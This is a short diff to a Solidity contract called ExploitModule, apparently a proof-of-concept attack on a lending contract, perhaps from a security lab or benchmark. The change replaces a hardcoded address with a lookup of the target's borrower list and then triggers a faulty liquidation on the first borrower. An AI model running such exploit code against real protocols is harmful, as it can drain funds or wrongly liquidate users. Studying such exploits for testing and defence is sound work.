@@ -171,7 +171,11 @@ contract ExploitModule {
     LendingLiquidation public target;
     constructor(address _t) payable { target = LendingLiquidation(payable(_t)); }
     function runExploit() external payable {
-        target.liquidateDefective(address(0xDDDD));
+        // The borrower is read from the public registry of the contract: its
+        // identity is a fact of the state, not a constant of the exploit.
+        address[] memory active = target.getBorrowers();
+        require(active.length > 0, "no borrower");
+        target.liquidateDefective(active[0]);
     }
     receive() external payable {}
 }
